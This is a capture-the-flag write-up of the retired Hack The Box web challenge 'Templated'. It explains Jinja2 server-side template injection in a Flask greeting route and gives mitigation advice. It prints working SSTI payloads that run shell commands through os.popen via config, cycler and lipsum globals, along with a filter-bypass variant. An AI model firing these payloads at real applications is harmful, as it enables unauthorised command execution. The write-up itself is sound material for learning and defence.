---
challenge: Templated
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, flask, jinja2, ssti, rce]
---

# Templated — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A Flask app greets by name: `/<name>` goes into `render_template_string`. That is **Jinja2 SSTI** in its purest form: `{{7*7}}` returns `49`, and the jump to RCE comes from reaching `os` through a function's globals.

## Brief

```text
http://<IP>:<port>/John
```

Returns `Hello John`. A custom 404 suggests the name is rendered, not merely printed.

## Analysis

```python
@app.route("/<name>")
def index(name):
    return render_template_string("Hello " + name)
```

The input is compiled as a template. Two quick checks:

```text
/{{7*7}}        -> Hello 49
/{{7*'7'}}      -> Hello 7777777
```

The first confirms arithmetic evaluation; the second confirms Jinja2 (Twig returns `49` for both).

## Exploitation

In Jinja2, `os` is reachable from the globals of any accessible function:

```text
/{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}
```

Alternative without `config`:

```text
/{{cycler.__init__.__globals__.os.popen('cat /flag*').read()}}
/{{lipsum.__globals__['os'].popen('id').read()}}
```

```text
HTB{<flag>}
```

If `.` or `_` is filtered, `request|attr('application')|attr('__globals__')` does the same with filters.

## Pitfalls

- **Odd URL characters**: encode `{`, `}`, `'` and `[` if the client complains; use `curl --path-as-is` when needed.
- **Newlines**: `popen(...).read()` prints output with `\n`; trim with `[:50]`.
- **Double escaping**: if the framework escapes the response, try `{%print(...)%}`.

## Lessons

- Concatenating input into `render_template_string` is RCE, not a greeting.
- Jinja2's global functions (`cycler`, `lipsum`, `joiner`) are the standard bridge to `os`.
- Mitigation: `render_template` with variables (`{{ name }}`), never user-built templates; sandbox if truly required.
